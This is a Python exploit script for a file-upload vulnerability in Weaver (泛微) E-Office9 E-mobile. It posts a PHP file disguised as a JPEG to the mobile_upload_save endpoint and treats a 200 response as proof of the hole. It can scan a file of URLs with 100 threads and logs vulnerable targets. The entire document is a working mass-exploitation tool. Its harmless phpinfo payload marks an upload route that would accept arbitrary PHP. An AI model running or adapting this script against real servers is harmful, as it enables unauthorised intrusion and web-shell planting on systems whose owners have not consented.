import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = '''
        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗         ███████╗██╗██╗     ███████╗
        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║        █████╗  ██║██║     █████╗  
        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║        ██╔══╝  ██║██║     ██╔══╝  
        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║     ██║███████╗███████╗
         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ 
                                                                                        author:秋妤
                                                                                        date:2024.09.13
                                                                                        version:1.0
    '''
    print(test)

def poc(target):
    url_payload= '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
        'Content-Length': '363',
        'Accept':' */*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language':' zh-CN,zh;q=0.9',
        'Connection':' close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
    }
    data="""
    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    Content-Disposition: form-data; name="upload_quwan"; filename="test.php."
    Content-Type: image/jpeg
    <?php phpinfo();?>
    -------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    Content-Disposition: form-data; name="file"; filename=""
    Content-Type: application/octet-stream
    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt—
        """

    try:
        res1=requests.post(url=target+url_payload,headers=headers,data=data,timeout=10)
        if res1.status_code==200:
            print( f"[+]{target} 存在漏洞！")
            with open('泛微_result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print(f'[-]{target}不存在漏洞')
            return False
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description = "这是一个关于 泛微 E-Office9文件上传漏洞的脚本")
    parser.add_argument("-u", "--url", dest = "url", help = "Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()